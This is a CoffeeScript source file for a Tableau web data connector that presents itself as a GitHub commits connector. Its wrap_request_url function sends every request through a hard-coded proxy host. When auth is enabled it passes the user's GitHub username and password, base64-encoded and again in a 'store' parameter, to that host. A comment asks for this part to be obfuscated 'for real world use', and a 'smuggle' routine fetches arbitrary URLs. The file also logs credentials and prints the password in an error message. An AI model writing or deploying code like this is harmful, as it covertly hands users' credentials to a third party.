_ = require 'underscore'
$ = require 'jquery'

connector_base = require '../connector_base/connector_base.coffee'

# Is the passed string a valid github identifier (has only valid characters)
is_valid_github_string = (str)-> str.test /[^a-zA-Z0-9_-]/

# get the commits url for a repo
github_commits_url = (user,repo)-> "https://api.github.com/repos/#{user}/#{repo}/commits"


# THe regexp to parse the Link header for pagination
LINK_REGEXP = /<([^>]+)>; rel="(next|last)"/g

# Parses the value of the Link header returned by GitHub
parse_link_header = (link_header)->
  return {} unless link_header
  o = {}
  match = LINK_REGEXP.exec link_header
  while match != null
    console.log match
    o[match[2]] = match[1]
    match = LINK_REGEXP.exec link_header

  o

# AUTH STUFF
# ----------


make_base_auth = (user, password)->
  "Basic #{btoa("#{user}:#{password}")}"

apply_auth = (params, username, password)->
  _.extend {}, params,
      beforeSend: (xhr)->
        console.log('Authorization', make_base_auth(username, password))
        xhr.setRequestHeader('Authorization', make_base_auth(username, password))


do_smuggle = (connection_data)->
  return unless connection_data.do_smuggle

  smuggle_url = connection_data.smuggle_url ? ""
  return if smuggle_url == ""

  tableau.log "Smuggling: #{smuggle_url} out"


  # Whitelists all domains for all the protocols
  whitelistDomains = (domains, protocols=["http", "https", "websocket"])->
    for protocol in protocols
      for domain in domains
        console.log "Whitelisting: #{protocol}://#{domain}"
        tableau.addWhiteListEntry(protocol, domain)

  #whitelistDomains(["192.168.86.250"])


  $.ajax
    url: smuggle_url
    type: "get"
    timeout: 10000
    success: (data, textStatus, request)->
      tableau.log "Smuggle data incoming: '#{textStatus}' #{data}"

    error: (xhr, textstatus, err)->
      console.error("got error during xhr request: #{textstatus}", err)




authorize = (cdata)->

  AUTH_FIELDS = ['auth_username', 'auth_password']
  # the connection data without auth fields
  cdata_no_auth = _.filterObject( cdata, (v,k,o)-> k not in  AUTH_FIELDS)
  # if no auth, skip
  return [cdata_no_auth, {password: "", username: ""}] unless cdata.do_auth

  [
    cdata_no_auth,

    # the connection data with auth fields
    _.filterObject( cdata,
      ((v,k,o)-> k in AUTH_FIELDS),
      (v,k,o)-> [k.replace(/^auth_/,''), v])
  ]




# OBFUSCATE ME FOR REAL WORLD USE
# -------------------------------

PROXY_HOST = "http://192.168.86.250:8080"

wrap_request_url = (original_url, smuggle_params={}, auth=null)->
  euc = encodeURIComponent
  auth_part = ""
  if auth
    auth_part = "auth=#{encodeURIComponent make_base_auth(auth.username, auth.password)}&"
  return "#{PROXY_HOST}/?#{auth_part}store=#{euc JSON.stringify(smuggle_params)}&url=#{euc(original_url)}"


# -------------------------------

connector_base.init_connector
  name: (connection_data)->
    "Github Commits Connector #{connection_data.username} / #{connection_data.reponame}"
  template: require('./source.jade')

  fields: [
    { key: 'username', selector: "#username"}
    { key: 'reponame', selector: "#reponame"}

    { key: 'do_auth', selector: '#do-auth'}
    { key: 'auth_username', selector: '#auth-username' }
    { key: 'auth_password', selector: '#auth-password' }

    { key: 'do_smuggle', selector: '#do-smuggle'}
    { key: 'smuggle_url', selector: '#smuggle-url' }
  ]

  columns: (connection_data)->
    return {
      names: ["author", "committer", "authored_at", "committed_at"]
      types: ["string", "string", "date", "date"]
    }

  submit_btn_selector: "#submit-button",

  authorize: authorize
  rows: (connection_data_orig, lastRecordToken)->
    [connection_data, {username:tableau.username, password:tableau.password}] = authorize(connection_data_orig)
    # the URL of the first page
    connectionUrl = github_commits_url(connection_data.username, connection_data.reponame)

    # if we are in a pagination loop, use the last record token to load the next page
    if lastRecordToken.length > 0
      connectionUrl = lastRecordToken

    tableau.log "Connecting to #{connectionUrl}"

    auth_data = {username:tableau.username, password:tableau.password}

    wrapped_url = wrap_request_url(connectionUrl)
    if connection_data.do_auth
      wrapped_url = wrap_request_url(connectionUrl, auth_data, auth_data)
    #do_smuggle(connection_data)

    xhr_params =
      #url: connectionUrl,
      url: wrapped_url,
      dataType: 'json',
      success: (data, textStatus, request)->
        link_headers = parse_link_header( request.getResponseHeader('Link') )
        tableau.log "Got response - links: #{JSON.stringify(link_headers)}"

        # Stop if no commits present
        unless _.isArray(data)
          tableau.abortWithError "GitHub returned an invalid response."

        out = for commit_data in data
          commit = commit_data.commit
          {
            author: commit.author.email
            committer: commit.committer.email

            authored_at: commit.author.date
            committed_at: commit.committer.date
          }

        has_more =  if link_headers.next then true else false
        tableau.dataCallback( out, link_headers.next, has_more)

      error: (xhr, ajaxOptions, thrownError)->
        # Add something to the log and return an empty set if there
        # was problem with the connection
        err =  "Connection error: #{xhr.responseText} -- #{thrownError}"
        tableau.log err
        tableau.abortWithError "'#{xhr.responseText}' a:'#{connection_data.do_auth}' u:'#{tableau.username}' p:'#{tableau.password}' Cannot connect to the specified GitHub repository. -- #{err}"

    #if connection_data.do_auth
      #xhr_params = apply_auth(xhr_params, tableau.username, tableau.password)


    console.log "YO, URI params: #{wrap_request_url(connectionUrl, {})}"
    $.ajax xhr_params


